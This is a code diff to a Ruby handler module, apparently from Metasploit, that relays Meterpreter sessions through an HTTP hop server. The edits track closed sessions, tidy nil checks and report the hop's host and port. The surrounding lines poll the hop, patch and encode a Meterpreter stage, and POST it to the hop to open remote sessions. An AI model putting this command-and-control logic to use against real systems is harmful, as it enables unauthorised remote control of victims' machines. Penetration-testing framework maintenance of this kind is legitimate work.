@@ -27,6 +27,7 @@ module ReverseHopHttp
   class << self; attr_accessor :hop_handlers end
   attr_accessor :monitor_thread # :nodoc:
   attr_accessor :handlers # :nodoc:
+  attr_accessor :closed_handlers # :nodoc:
   attr_accessor :mclient # :nodoc:
   attr_accessor :current_url # :nodoc:
   attr_accessor :control # :nodoc:
@@ -57,6 +58,7 @@ module ReverseHopHttp
   #
   def setup_handler
     self.handlers = {}
+    self.closed_handlers = {}
   end
 
   #
@@ -95,7 +97,7 @@ module ReverseHopHttp
         delay = delay + 1 if delay < 10 # slow down if we're not getting anything
         crequest = hop_http.mclient.request_raw({'method' => 'GET', 'uri' => control})
         res = hop_http.mclient.send_recv(crequest) # send poll to the hop
-        next if res == nil
+        next if res.nil?
         if res.error
           print_error(res.error)
           next
@@ -116,7 +118,7 @@ module ReverseHopHttp
           pack.body = received
           hop_http.current_url = urlpath
           hop_http.handlers[urlpath].call(hop_http, pack)
-        else
+        elsif !closed_handlers.include? urlpath
           #New session!
           conn_id = urlpath.gsub("/","")
           # Short-circuit the payload's handle_connection processing for create_session
@@ -154,14 +156,15 @@ module ReverseHopHttp
   #
   def add_resource(res, opts={})
     self.handlers[res] = opts['Proc']
-    start_handler if self.monitor_thread == nil
+    start_handler if monitor_thread.nil?
   end
 
   #
   # Removes a resource.
   #
   def remove_resource(res)
-    self.handlers.delete(res)
+    handlers.delete(res)
+    closed_handlers[res] = true
   end
 
   #
@@ -175,14 +178,14 @@ module ReverseHopHttp
   #
   def send_response(resp)
     if not resp.body.empty?
-      crequest = self.mclient.request_raw(
+      crequest = mclient.request_raw(
           'method' => 'POST',
-          'uri' => self.control,
+          'uri' => control,
           'data' => resp.body,
-          'headers' => {'X-urlfrag' => self.current_url}
+          'headers' => {'X-urlfrag' => current_url}
       )
       # if receiving POST data, hop does not send back data, so we can stop here
-      self.mclient.send_recv(crequest)
+      mclient.send_recv(crequest)
     end
   end
 
@@ -207,7 +210,8 @@ module ReverseHopHttp
   # Returns the URL of the remote hop end
   #
   def peerinfo
-    URI(full_uri).host
+    uri = URI(full_uri)
+    "#{uri.host}:#{uri.port}"
   end
 
   #
@@ -231,7 +235,7 @@ module ReverseHopHttp
     url = full_uri + conn_id + "/\x00"
 
     print_status("Preparing stage for next session #{conn_id}")
-    blob = self.stage_payload
+    blob = stage_payload
 
     # Replace the user agent string with our option
     i = blob.index("METERPRETER_UA\x00")
@@ -270,15 +274,15 @@ module ReverseHopHttp
     blob = encode_stage(blob)
 
     #send up
-    crequest = self.mclient.request_raw(
+    crequest = mclient.request_raw(
         'method' => 'POST',
         'uri' => control,
         'data' => blob,
         'headers' => {'X-init' => 'true'}
     )
-    res = self.mclient.send_recv(crequest)
+    res = mclient.send_recv(crequest)
     print_status("Uploaded stage to hop #{full_uri}")
-    print_error(res.error) if res != nil && res.error
+    print_error(res.error) if !res.nil? && res.error
 
     #return conn info
     [conn_id, url]
